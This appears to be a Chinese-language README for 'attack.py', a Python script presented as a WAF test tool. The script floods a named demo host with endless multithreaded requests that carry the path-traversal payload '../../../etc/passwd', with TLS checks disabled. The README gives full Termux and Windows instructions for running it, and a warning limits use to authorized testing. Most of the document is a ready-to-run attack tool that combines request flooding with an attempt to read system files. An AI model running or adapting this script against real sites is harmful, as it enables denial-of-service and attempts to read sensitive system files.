# ⚠️ 高频 HTTP 请求测试脚本（含潜在攻击行为）
> [!CAUTION]
> 🚨 **危险警告：请勿非法使用！**
>
> 本脚本用于测试 WAF 防护、路径穿越检测等，仅限在授权环境中使用。
> 
> ⚠️ **如你对未授权站点执行此代码，可能构成违法攻击行为。**
>
> - 本代码仅供学习、研究与授权测试使用
> - 如有非法用途，后果自负，作者与平台概不负责！

![Image](https://github.com/user-attachments/assets/777aa6a7-7678-4ddf-8e0c-8a27af4a8330)

---

## 🧠 脚本简介

该 Python 脚本使用多线程方式高频访问目标 URL，模拟路径遍历攻击请求（示例 payload 为 `../../../etc/passwd`），用于测试 Web 防火墙（WAF）对恶意参数的拦截与响应能力。

---

## 🖥️ 使用教程

本脚本支持在 **Windows 环境** 和 **Android Termux** 环境下运行。

---

### 📱 Termux 使用教程（Android 手机）

1. 打开 Termux，更新源和安装环境：

    ```bash
    pkg update && pkg upgrade
    pkg install python git
    pip install requests
    ```

2. 创建一个新脚本文件 `attack.py`：

    ```bash
    nano attack.py
    ```

3. 将下方完整脚本复制粘贴进去，按 `Ctrl+X` → `Y` → 回车 保存退出。

4. 运行脚本：

    ```bash
    python attack.py
    ```

---

### 🪟 Windows 使用教程

1. 安装 [Python 官网版本](https://www.python.org/downloads/windows/)
    - 安装时勾选 “Add Python to PATH”
    - 安装后打开命令提示符 `cmd`

2. 安装依赖库：

    ```bash
    pip install requests
    ```

3. 保存以下代码为 `attack.py` 文件。

4. 双击运行或使用命令：

    ```bash
    python attack.py
    ```

---

## 💻 脚本源码（attack.py）

```python
import requests
import threading
import time
import os
import urllib3

# 忽略 HTTPS 证书警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 目标信息
TARGET_URL = "https://demo.waf-ce.chaitin.cn:10084/hello.html"
PAYLOAD = "../../../etc/passwd"

# 请求参数配置
PARAMS = {
    "payload": PAYLOAD
}
HEADERS = {
    "User-Agent": "WAF-Test-Agent/1.0",
    "Referer": "https://demo.waf-ce.chaitin.cn/"
}

# 自动识别线程数（等于 CPU 核心 * 2）
THREAD_COUNT = os.cpu_count() * 2
print(f"[*] 启用线程数：{THREAD_COUNT}")

# 是否持续攻击
CONTINUOUS_ATTACK = True  # 设置为 False 可控制是否持续运行

# 单线程攻击逻辑
def attack_loop(thread_id):
    count = 0
    while CONTINUOUS_ATTACK:
        try:
            response = requests.get(TARGET_URL, headers=HEADERS, params=PARAMS, timeout=3, verify=False)
            count += 1
            print(f"[线程 {thread_id}] 状态码: {response.status_code}，请求数: {count}")
        except Exception as e:
            print(f"[线程 {thread_id}] 错误: {e}")

# 启动所有线程
def start_attack():
    threads = []
    for i in range(THREAD_COUNT):
        t = threading.Thread(target=attack_loop, args=(i + 1,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

if __name__ == "__main__":
    print("[*] 持续攻击开始，按 Ctrl+C 停止")
    start_attack()